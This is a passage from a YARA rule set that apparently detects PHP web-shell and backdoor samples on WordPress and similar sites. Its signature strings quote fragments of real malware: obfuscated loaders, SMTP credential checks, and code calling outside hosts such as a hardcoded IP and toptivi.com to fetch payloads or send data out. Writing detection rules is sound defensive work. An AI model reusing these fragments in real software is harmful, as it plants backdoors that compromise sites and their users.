      $s8 = "if (!$afp) {post_stats('A1');exit;}fwrite($afp, \"GET \".$atte[0].\" HTTP/1.0\\r\\nHost: \".$affdom[0].\"\\r\\nConnection: Close" ascii
      $s9 = "if (!$afp) {post_stats('A1');exit;}fwrite($afp, \"GET \".$atte[0].\" HTTP/1.0\\r\\nHost: \".$affdom[0].\"\\r\\nConnection: Close" ascii
      $s10 = "fputs($fp,\"AUTH LOGIN\\r\\n\");$code = substr(get_data($fp),0,3);if($code != 334) {fclose($fp); return (\"BAUTH\");}" fullword ascii
      $s11 = "fputs($fp,\"AUTH LOGIN\\r\\n\");$code = substr(get_data($fp),0,3);" fullword ascii
      $s12 = "function smtp_lookup($host){if(function_exists(\"getmxrr\")){getmxrr($host,$mxhosts,$mxweight);return $mxhosts[0];}else{win_getm" ascii
      $s13 = "function smtp_lookup($host){if(function_exists(\"getmxrr\")){getmxrr($host,$mxhosts,$mxweight);return $mxhosts[0];}else{win_getm" ascii
      $s14 = "function mch($host,$port,$mail,$pass){" fullword ascii
      $s15 = "if (!socket_connect($socket, $hp[0], $hp[1])){socket_close($socket);}else{socket_write($socket, \"GET http://\".$sd.\"/post.php " ascii
      $s16 = "}else if(strripos($authcheck, 'LOGIN')){" fullword ascii
      $s17 = "$len_login = chr(strlen($sl));" fullword ascii
      $s18 = "$h=pack(\"H*\",\"01\").$len_login.$sl.$len_pass.$sc;" fullword ascii
      $s19 = "$hostname = gethostbyaddr($unkhost);" fullword ascii
      $s20 = "$duri='smtp/'.$host.'/'.$pd;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule infected_Navy_next {
   meta:
      description = "Navy - file next.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "f894037ff238b4e45e6961a191dc52ec6b09a471c031a08de7381acb0af7c001"
   strings:
      $x1 = "echo gzuncompress(base64_decode(\"eNokXdey6jqQffb9CjGEApMsCUsyoWDIOWcKKNIm5xy/fVpnHm44Z3vbCt2r15Jarf9KO5Q4nfYnVJ2dr9sZKs4el/+myy" ascii
      $x2 = "} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])<>'127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP'])<>" ascii
      $s3 = "$domain = 'UAJxURKDg7HljWK.MDQ'; $domains = 'J5snktaiZ'; $sourceid = '';  $flowdomain = 'f303050'; $codenamemode = 'API'; if (!f" ascii
      $s4 = "<?php if($_GET['mod']){if($_GET['mod']=='0XX' OR $_GET['mod']=='00X'){$g_sch=file_get_contents('http://www.google.com/safebrowsi" ascii
      $s5 = "<?php if($_GET['mod']){if($_GET['mod']=='0XX' OR $_GET['mod']=='00X'){$g_sch=file_get_contents('http://www.google.com/safebrowsi" ascii
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ' */
      $s8 = "header(\"Content-Disposition: attachment; filename=\\\"2345234523.vbs\\\"\");" fullword ascii
      $s9 = "header(\"Content-Description: File Transfer\");" fullword ascii
      $s10 = "$g_sch = str_replace('\"listed\"', '', $g_sch, $g_out);if($g_out){header('HTTP/1.1 202');exit;}}if($_GET['mod']=='X0X' OR $_GET[" ascii
      $s11 = "od']=='00X'){$sh = gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');" fullword ascii
      $s12 = "$_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://104.193.252.21/apipost.php'); cu" ascii
      $s13 = "ARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>'127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>($_SERVER['SERVER_ADD" ascii
      $s14 = "header(\"Content-Transfer-Encoding: binary\");" fullword ascii
      $s15 = "2345234523" ascii /* hex encoded string '#E#E#' */
      $s16 = "+RLm5yEkzohRclHCBCz+i90VF2kKrP30U5MdkQ4ipP0Gj0NTwn8tEmp0IYlNGPYJUs6li/ob5p7c4vGKYpjWI0g3alnGrfP4wlCxmA1OlKSLtmd5vdSwGttoB08d4z44" ascii
      $s17 = "0QoLGBPYbOEUy5ttjCV7fUB2HC6fZ7NhtkFPnACNI0/qqxHBhU3yQvprdKF36u27dF0kvFft8De3wgtI/KfvNElOgEoTUIFh6Dod81QwjEGJcbvQMm8vshxhqyUEG0/2" ascii
      $s18 = "USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $ua=getRealua" ascii
      $s19 = "GUJ39I0dlQ75251XC3G9lYhK+cfcdFawVfkmCj3DssbOqAptZNawlFH94zQGe7FuHIflTo0ivDmWDD3v0D+tHJi6g3oV4F4vCbR2foqHeXG6xvyp9dfTpQYdSq4GJXsW" ascii
      $s20 = "UPrwJt+aDDQ9htsePmFGiN4Doj9RQr0+0wrvofnbAgax/G9o7narRtZ5MGFrAf8DY78lxWnwdM9J89pErF67ZRiUKWu0f9LFTPdinhKFbjdze2iDNWaAemWBq3Z84XYV" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule Navy_import {
   meta:
      description = "Navy - file import.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "386cc2bf463b616f10f04e72bc7a9ed1a340c21d8bc611ceadd65a29c26dc2c5"
   strings:
      $x1 = "$SGuBMYFP6885 = \"EA8+GilmDgdbdXI4OwI/ezUCVk5vax0YFioZPiZdQUBQOhUxMwwCKTZhYEA3JGMBEmcWH1sEByAoHTsnDikpCFR7AQQ+MQU4HF1/R2oLBSkjDA" ascii
      $s2 = "RehAjPSAIFSMmendUMjUDBgETLwhzZXIrLx4oPB0AXwB/dxISEyE4Hw0seFF6ECM9IAgVIyZ6d1QaIRsOAhcFCHB1cjQrGSgsHQcuXn9wAQ0APg0/DSsJUVcbKGszHyc" ascii
      $s3 = "acH5pOwASPycEFyZXeloBUAM+M2UePA1YejojNCUiMy8LVHBANzUPUBsHFglscwoHNBwaJTd3KUpuARkKOVseOhw7AVhQYTQpMxwadDVuZ10cCzkHAAdwAWlfUCYoEjM" ascii
      $s4 = "OAhcFCHB1cjQrGSgsHQcuXn9wEgUTKgozDihSRHgpEREqGj8OLGhaChALGw4CFwUIcHVyNCsZKCwdBy5ef3ASBRMqCjMlOGBZegAwNTMcEi8kaFlUGiEbDgIXBQhwdXI" ascii
      $s5 = "BdXVXKQYNBSA3AzlAVHAwEhUeJDMNLHhRehAjPSAIFSMmendUGiEbDgETFgdbW1c/ATMoch0DKUBVXhVXESovJh03YFh/EAYvC3kFPiJQVUAZUBACEmZ9FmNhYj0uGQ1" ascii
      $s6 = "Sf1kgKRk4IB4HOFVbeBYjMTF6FhQ6CGRRGVEbEQFldAhpYgM0KGknJzYDOVNScDASEyE4Hwc+UnxwAgkxMXoWFDoIZFEZURsRAWV0CGllcj0BAj8nNyoEV3lEPAUTKgo" ascii
      $s7 = "lKxkgczAMJhJmewEJEyEvJB4na1ljByc9CngGcQ1+YwoZUBAfKDkWA1pfAmMAaSh9GSotDX97HRQ4Lic/DSx0BH05O20jMWB8DAp0WzEIbzwSAw4cY25+ZTIZUDE3Ayl" ascii
      $s8 = "qC3lgIzkIeGMwUAxZEmZ9GVgEXz8pGTs5GAcuUlJaOAU/HiQzDSx4UXkVWx49e20IPGxgURklLg0CEHQIc35qZCEzKCwdBy1DbGsBCDhbciYlOGxZeRQRKSAIBnYkbUV" ascii
      $s9 = "dCzY1BwEtLwh1X3I6KCBdABcVBAFVABEKOAN+AicoQUBqBDM9MyY4NzVtWQsfURQeEgNwRHNxXyk6aQ0yNRw9UW9eKw4KLgEtFAVBRlE9IGsNCBYuDX5wSTAYagcvE30" ascii
      $s10 = "7ASMoIDV2OQx/d2NJEyoZZh04QQdpAAkRKho/DixoXXkQMzEjEQMKAFtPcj0yEjskBC0MTHx0Jw4/On86FCwABlIXVjQmPDsOLGhdeRAzMSMIDA4DWgRlYykZOzswAzl" ascii
      $s11 = "PVxdaMQoMbT0LfVlJHhgbWwAHMwhzcUslOGgFPhgHLlJVdBUYORAgYwcIUnxwAg4bCxM4PgxuTlUKUCIfKGYRAHN+eT8BIwJ8FyMEc3ViPxsAMRllJwINUXkbKDYKMSc" ascii
      $s12 = "9DgM6Vnx0CQAQW348JjhsWGsACS8jeiMqI3p0UBlQCB8vZnEcWwR1ODoZCjsdLlp8ZnBqCgoAKGIOFlpGfzoBYiV4Bi8/U0FFNyoTQgEuNyR6Z1g4ABkoch0HPUpmSRJ" ascii
      $s13 = "+NwMHTnxJJwk4WwVlJjhvQ1cQVzUzImE+C258RzI6CwYAAjMGaVxLOgEwXQAXFQRzZnQ/FzkhHWQNJ2sDUBQ3YyN5HnULcWRFMQs5Di85AhxdYWZqKGhYIBoXWkBsZAE" ascii
      $s14 = "GEQcGGl1hAjo4AiAsNnY2XlVealE5EzwiIChoHXA0CRAqHyMyC3F/GBAFMSMbF31fYGF5IDgOXQAXFQQBVQEdGzsxCWQUCFZRehAjPSAIFSMmendUGiEYExNmFgZpZVA" ascii
      $s15 = "fYQV9PwYZDiUOHCVAVAAZBDgucjoOFkF5ZQYaFyIfJw8+flpGMjRjExEMFQBzBEslOGtQJzcqJU9VXR4MFi0KJAsYSXdSBFcqMXgaKAt6UV0xNRxdE2YSW2NhfWIGHQU" ascii
      $s16 = "Wf2QFFjkhGWEPLGtQZmM0CT8gAhc4QFJ6BSQIOBNlEjtrYHk1Mw8NDQAoPlduYDgSEyE4Hw0seFF6EDBrCnkCPT5uUl8xDAgTAhB0CGBueSo7AgIkHS8LT1QBNxEAOgI" ascii
      $s17 = "EA1odLScCb0NXFVtrCnkCPSR6XQQQBTEjARwSH2N1cmorHyslDhw9TVNrBRIAKiwkCxhWfHAAMDQIHAUjP2p0cglQDFkpDCgBWGFiPCkOGgAXFQRSbAAZFD4xCjMUPHh" ascii
      $s18 = "WOFoROB4sWkZ8JA0QKhwCNwwLY3gQMzEjEQMKAFtPcj0GDVw4NRNaS390BRs5BHItDTxaAXA6Iz0gCBY0NVBRWAtTGDkeZRYNcwVyKyhrWSwdEF9efAA/DjkQKCQHBnh" ascii
      $s19 = "HYARAJztoUD42KTlTUnASBQ1aCTgnAkFSYxBbIAoMEjE/U05aMAtiQggzKDtjbnlhOAIgfR0AF0lUXRFTPioJZCE3e1pjAAZqMxM8dCVAdEYKNWsFGwcgFWNueWE4AiA" ascii
      $s20 = "IcFxLJQESOzs2dlteUl4VET4+Hm0OXHteUGAwNiMxYRU2YXgDCTEbHwIRChlbbnEqOAInMQQHVk9VewESOFt/fw0FSn16ECM9IAwCLg5+DlQaCC0fKGYSHGNhfWMyMzM" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule infected_Navy_m19_pay {
   meta:
      description = "Navy - file m19_pay.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "ffa1f05c1eb072ea886317b4688fb466e3304d4ffed0a490c0ab8bcfc9af4208"
   strings:
      $s1 = "***************************************************************************/                                                    " ascii
      $s2 = "BiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVVTVTFGVDFWVUxDQWlOakFpS1RzTkNpUm5iM1J2SUQwZ1kzVnliRjlsZUdWaktDUmphQ2s3SUdOMWNteGZZMnh2YzJVb0pHTm" ascii
      $s3 = "yyyyyysyyeyyyyy6yyyy4yyyyy_yyyydyyyyeyyyyycyyyyoyyydyyyyeyyy\";if(version_compare(PHP_VERSION, '5.3.0', '>=')) {error_reporting(" ascii
      $s4 = "thVjA5SnljdVltRnpaVFkwWDJSbFkyOWtaU2duVUVRNWQyRklRVDBuS1M0bklDUmhlbVo1Y1hKd2NXUnJkbmRoWXowaUp5NWlZWE5sTmpSZlpXNWpiMlJsS0NSZlVFOV" ascii
      $s5 = "VZMjlrWlNna1gxTkZVbFpGVWxzblVFRlVTRjlKVGtaUEoxMHBPMzBOQ21Wc2MyVWdleUFrZEY5amIyOXJhV1U5SnljN0lIME5DaVJmYkdsdWF6MWlZWE5sTmpSZlpHVm" ascii
      $s6 = "thV1lvWlcxd2RIa29KSGxoY25WbGFHUjZkV2dwS1NCN0pHUnZiU0E5SUdWNGNHeHZaR1VvSWk4aUxDQmlZWE5sTmpSZlpHVmpiMlJsS0NSaGVtWjVjWEp3Y1dScmRuZG" ascii
      $s7 = "ycm');$fryvqhswtxdkc=$crswexgqbe($zrvbtz);user_error($fryvqhswtxdkc,E_USER_ERROR);" fullword ascii
      $s8 = "if( version_compare(PHP_VERSION, '5.3.0', '>=') )" fullword ascii
      $s9 = "5YUzRuSURNd01pQkdiM1Z1WkNjcE95Qm9aV0ZrWlhJb0oweHZZMkYwYVc5dU9pQm9kSFJ3T2k4dkp5NGtYMU5GVWxaRlVsc25TRlJVVUY5SVQxTlVKMTB1SkY5VFJWSl" ascii
      $s10 = "djbVYwZFhKdUlDUmZVMFZTVmtWU1d5ZFNSVTFQVkVWZlFVUkVVaWRkT3lCOURRcHBaaUFvWVhKeVlYbGZhMlY1WDJWNGFYTjBjeWdrYTJWNUxDQWtYMU5GVWxaRlVpa3" ascii
      $s11 = "tZM1Z5YkY5elpYUnZjSFFvSkdOb0xDQkRWVkpNVDFCVVgxTlRURjlXUlZKSlJsbFFSVVZTTENCbVlXeHpaU2s3RFFwamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreF" ascii
      $s12 = "thM1ozWVdNcExpY2lQand2ZEdRK1BIUmtQbFJFVXlCSlVEd3ZkR1ErRFFvOGRHUStQR2x1Y0hWMElIUjVjR1U5SW5SbGVIUWlJRzVoYldVOUluQjBaSE5wY0NJZ2RtRn" ascii
      $s13 = "lYRzRpT3cwS1puZHlhWFJsS0NSbWNDd2dKRzkxZENrN0RRcDNhR2xzWlNBb0lXWmxiMllvSkdad0tTa2dldzBLSkhOMGNqMW1aMlYwY3lna1puQXNNVEk0S1RzTkNtbG" ascii
      $s14 = "5PeUI5RFFwcFppZ2haVzF3ZEhrb0pGOVRSVkpXUlZKYkoxTkZVbFpGVWw5QlJFUlNKMTBwS1NCN0pIUmZjMlZ5ZG1WeVgyRmtaSEk5ZFhKc1pXNWpiMlJsS0NSZlUwVl" ascii
      $s15 = "1LQ1JwUFQwd0tTQjdEUW9rYTJFOUp5Y3VZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVQwbktTNG5JQzh2VGtoVUp6c05DaVJyWVd0aFBTUnJZUzRuV2taVkx5OG" ascii
      $s16 = "dSVkpiSjFKRlVWVkZVMVJmVlZKSkoxMHVLSEJ5WldkZmJXRjBZMmdvSnk5Y1AzeGNQUzlwYzNVbkxDUmZVMFZTVmtWU1d5ZFNSVkZWUlZOVVgxVlNTU2RkS1NBL0lDY2" ascii
      $s17 = "ZMeTlrYjIwdWRHeGtMeWNwT3cwS2FXWW9KR2R2ZEc5bFd6QmRQVDBuYUhSMGNDY2dmSHdnSkdkdmRHOWxXekJkUFQwbmFIUjBjSE1uS1NCN0lHaGxZV1JsY2lna1gxTk" ascii
      $s18 = "BJSFI1Y0dVOUluUmxlSFFpSUc1aGJXVTlJbkIwYnlJZ2RtRnNkV1U5SWljdVltRnpaVFkwWDJSbFkyOWtaU2drWTJobmRtUmplWFprWjJkaWRpa3VKeUkrUEM5MFpEND" ascii
      $s19 = "BZWFJwWXlBa1ptOXlkMkZ5WkdWa0lEMGdZWEp5WVhrb0RRb3ZMeWRJVkZSUVgwTk1TVVZPVkY5SlVDY3NEUW92THlkSVZGUlFYMWhmUms5U1YwRlNSRVZFWDBaUFVpY3" ascii
      $s20 = "lWRlJRWDFWVFJWSmZRVWRGVGxRblhTazdEUW9rZEY5c1lXNW5QWFZ5YkdWdVkyOWtaU2drWDFORlVsWkZVbHNuU0ZSVVVGOUJRME5GVUZSZlRFRk9SMVZCUjBVblhTaz" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule Navy_outcms {
   meta:
      description = "Navy - file outcms.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "7363e4577f2485886f23054ec2eddad853f0b922490848e2baf72cb3be9f54fe"
   strings:
      $s1 = "$html = get_page($d['template_url']);" fullword ascii
      $s2 = "if(array_keys($_GET)[0] && array_keys($_GET)[0] == 'init' ){" fullword ascii
      $s3 = "$result['PostURL'] = $_SERVER['SCRIPT_URI'].$filename;" fullword ascii
      $s4 = "elseif(array_keys($_GET)[0] && array_keys($_GET)[0] == 'list'){" fullword ascii
      $s5 = "$result['PostURL'] = str_replace(basename($_SERVER['SCRIPT_URI']),\"\", $result['PostURL']);" fullword ascii
      $s6 = "elseif(array_keys($_GET)[0] && array_keys($_GET)[0] !== 'init' && array_keys($_GET)[0] !== 'list'){" fullword ascii
      $s7 = "/* if(!$d['template_url'] || $d['template_url'] == \"\"){" fullword ascii
      $s8 = "$d = file_get_contents('php://input');" fullword ascii
      $s9 = "//posts exists and override set to 0 (No)" fullword ascii
      $s10 = "/* echo $script_path;" fullword ascii
      $s11 = "//$path = array(\"content/pages\", \"contents/pages\", \"contents/posts\", \"pages/content\",\"posts/content\");" fullword ascii
      $s12 = "echo ('{\"result\": \"Error. Post exists\",\"action\":\"Upload Post\" }');" fullword ascii
      $s13 = "if($_POST['ver'] && $_POST['ver'] == 'upd'){" fullword ascii
      $s14 = "if(a($filename,$posts) && $d['or'] == 0){" fullword ascii
      $s15 = "if($d == false && isset($_POST['a']) == false)" fullword ascii
      $s16 = "$result['result'] = \"Error. No Such Post\";" fullword ascii
      $s17 = "if($_POST['a'] && $_POST['a' ] == 'upl' ){" fullword ascii
      $s18 = "$result['action'] = \"Upload Post\";" fullword ascii
      $s19 = "$posts = scandir(getcwd());" fullword ascii
      $s20 = "$files = scandir(getcwd());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-12-22
   Identifier: work1
   Reference: https://github.com/Hestat/lw-yara/
   Reference malware samples: https://github.com/NavyTitanium/Misc-Malwares/tree/master/PHP 
*/

/* Rule Set ----------------------------------------------------------------- */

rule backdoor_countyu {
   meta:
      description = "work1 - file backdoor_countyu.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "a539719a580d96a952b5e81928b0c50d5fac7c35f84ca83a143c929f67c1806b"
   strings:
      $s1 = "$mb4a88417b3d0170d = file_get_contents(base64_decode($v634894f9845d8dc65).$kkk557);" fullword ascii
      $s2 = "curl_setopt($kd88fc6edf21ea464, CURLOPT_USERAGENT, base64_decode('bmV3cmVxdWVzdA=='));" fullword ascii
      $s3 = "$ke4e46deb7f9cc58c = json_decode(base64_decode(fread($se1260894f59eeae9, filesize($s8c7dd922ad47494f))) , 1);" fullword ascii
      $s4 = "$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;" fullword ascii
      $s5 = "$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $m9b207167e5381c47[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;" fullword ascii
      $s6 = "unlink($s8c7dd922ad47494f); $ab4a88417b3d0170f = base64_decode('TG9jYXRpb246IA==') . $ye617ef6974faced4;" fullword ascii
      $s7 = "$d07cc694b9b3fc636 = $h77e8e1445762ae1a - $deaa082fa57816233;" fullword ascii
      $s8 = "$mb4a88417b3d0170d = curl_exec($kd88fc6edf21ea464);" fullword ascii
      $s9 = "curl_setopt($kd88fc6edf21ea464, CURLOPT_URL, base64_decode($v634894f9845d8dc65).$kkk557);" fullword ascii
      $s10 = "$v634894f9845d8dc65 = 'aHR0cDovL3JvaS10cmFmZmljLmljdS9nZXQucGhwP2Y9anNvbiZrZXk9';" fullword ascii
      $s11 = "$h0666f0acdeed38d4 = @fopen($s8c7dd922ad47494f, base64_decode('dys='));" fullword ascii
      $s12 = "$se1260894f59eeae9 = @fopen($s8c7dd922ad47494f, base64_decode('cg=='));" fullword ascii
      $s13 = "$ke4e46deb7f9cc58c = json_decode($mb4a88417b3d0170d, true);" fullword ascii
      $s14 = "$s8c7dd922ad47494f = dirname(__FILE__) . \"/\" . md5($ed6fe1d0be6347b8e);" fullword ascii
      $s15 = "if ($m9b207167e5381c47[base64_decode('ZG9tYWlu') ]) {" fullword ascii
      $s16 = "if ($ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ]) {" fullword ascii
      $s17 = "$bb4a88417b3d0170f = strlen($ab4a88417b3d0170f); header(\"Set-Cookie: bb4a88417b3d0170f=$bb4a88417b3d0170f\"); header($ab4a88417" ascii
      $s18 = "$bb4a88417b3d0170f = strlen($ab4a88417b3d0170f); header(\"Set-Cookie: bb4a88417b3d0170f=$bb4a88417b3d0170f\"); header($ab4a88417" ascii
      $s19 = "$m9b207167e5381c47 = v64547f9857d8dc65($s8c7dd922ad47494f);" fullword ascii
      $s20 = "$kkk557 = \"723d60518a520564b23f4de72fd97781\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_27887b6fb476f7449305ee367b01f779 {
   meta:
      description = "work1 - file backdoor_27887b6fb476f7449305ee367b01f779.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "8d00a0154dbf5a9385a546acf852760afe7b44746f4e485da994d7ce0c6f1ca4"
   strings:
      $x1 = "$html=file_get_contents('http://toptivi.com/wp-content/app.php?email='.$emaillls);" fullword ascii
      $x2 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'>" fullword ascii
      $s3 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s4 = "<link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >" fullword ascii
      $s5 = "* Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5" fullword ascii
      $s6 = "$sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s7 = "$sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s8 = "$privKeyStr = file_get_contents($this->DKIM_private);" fullword ascii
      $s9 = "<li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>" fullword ascii
      $s10 = "$sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));" fullword ascii
      $s11 = "Reciver Email = <b>user@domain.com</b><br>" fullword ascii
      $s12 = "$DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body" fullword ascii
      $s13 = "* and creates a plain-text version by converting the HTML." fullword ascii
      $s14 = "* Usually the email address used as the source of the email" fullword ascii
      $s15 = "<li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>" fullword ascii
      $s16 = "$password = \"4b7554c77a57531a3baa03dc166addb8\"; // Password " fullword ascii
      $s17 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form>" ascii
      $s18 = "* PHPMailer only supports some preset message types," fullword ascii
      $s19 = "* @param string $patternselect A selector for the validation pattern to use :" fullword ascii
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_zzz_2 {
   meta:
      description = "work1 - file backdoor_zzz_2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "56114895e46ae1b71f3d8620e04703892bead737b774446a28e649da3919c1df"
   strings:
      $s1 = "if (file_exists(\"cqenpf76ipf2.php.suspected\")) rename (\"cqenpf76ipf2.php.suspected\", \"cqenpf76ipf2.php\");" fullword ascii
      $s2 = "RewriteRule ^([A-Za-z0-9-]+).html$ cqenpf76ipf2.php?world=5&looping=176&hl=$1 [L]\");" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor_wp_config {
   meta:
      description = "work1 - file backdoor_wp-config.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "5057d290bbf35f7440ce7fa9c30354c8442fa77080f41066530c76d06b242008"
   strings:
      $s1 = "= str_replace('sx', '64', $ee); $algo = 'kolotyska'; $pass = \"Zgc5c4MXrL8kbQBSs88NKfKeflvUNPlfnyDNGK/X/wEfeQ==\";" fullword ascii
      $s2 = "if (fopen(\"$subdira/.$algo\", 'w')) { $ura = 1; $eb = \"$subdira/\"; $hdl = fopen(\"$subdira/.$algo\", 'w'); break; }" fullword ascii
      $s3 = "$data = file_get_contents($url);" fullword ascii
      $s4 = "if (fopen(\"$dira/.$algo\", 'w')) { $ura = 1; $eb = \"$dira/\"; $hdl = fopen(\"$dira/.$algo\", 'w'); break; }" fullword ascii
      $s5 = "if (!$ura && fopen(\".$algo\", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(\".$algo\", 'w'); }" fullword ascii
      $s6 = "define( 'DB_PASSWORD', '' );" fullword ascii
      $s7 = "define( 'SECURE_AUTH_KEY',  '' );" fullword ascii
      $s8 = "/* That's all, stop editing! Happy publishing. */" fullword ascii
      $s9 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s10 = "$reqw = $ay($ao($oa(\"$pass\"), 'wp_function'));" fullword ascii
      $s11 = "curl_setopt($ch, CURLOPT_HEADER, 0);" fullword ascii
      $s12 = "require_once( ABSPATH . 'wp-settings.php' );" fullword ascii
      $s13 = "function get_data_ya($url) {" fullword ascii
      $s14 = "define( 'DB_HOST', 'localhost' );" fullword ascii
      $s15 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s16 = "define( 'LOGGED_IN_KEY',    '' );" fullword ascii
      $s17 = "@ini_set('display_errors', '0');" fullword ascii
      $s18 = "define( 'SECURE_AUTH_SALT', '' );" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_wp_main {
   meta:
      description = "work1 - file backdoor_wp-main.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "6269e609deb8dace97457f319f20daddaf50e78767dde684984d9d70f129212b"
   strings:
      $x1 = "<?php error_reporting(E_ERROR|E_WARNING|E_PARSE|E_COMPILE_ERROR);ini_set('display_errors','on');set_time_limit(0);check_commands" ascii
      $s2 = "90cb14);$wny04d597606e0989a6=execute_query(\"UPDATE \".$wid727bb92f57c3951d.\"posts SET post_content = '$kmi72f67a08bb51167e' WH" ascii
      $s3 = "f0f862b0c65d1b8=execute_query(\"INSERT INTO \".$wid727bb92f57c3951d.\"posts (`post_title`, `post_content`, `post_status`, `post_" ascii
      $s4 = "=execute_query(\"SELECT id,guid,post_content FROM \".$wid727bb92f57c3951d.\"posts WHERE id = $drie5a9d8684a8edfed\");$rvu3f0f862" ascii
      $s5 = "8){echo\"Failed to execute query ($eipe0af5865757b3f2a): \".get_error();die;}return $rvu3f0f862b0c65d1b8;}function get_error(){g" ascii
      $s6 = "05039f7a65);dispatch_exec_commands_for_conf();}function config_parse_insert_post(){list($slz87de66479aea0306,$sto2040a28d572e088" ascii
      $s7 = "'login',$lgc518fd46dddb3f97e[array_rand($lgc518fd46dddb3f97e)]);return $vgta455620d6612d981->$ovpbbf2466e744a5003;}function get_" ascii
      $s8 = "6df5bde;global $wid727bb92f57c3951d;$rvu3f0f862b0c65d1b8=execute_query(\"SELECT id FROM \".$wid727bb92f57c3951d.\"posts WHERE po" ascii
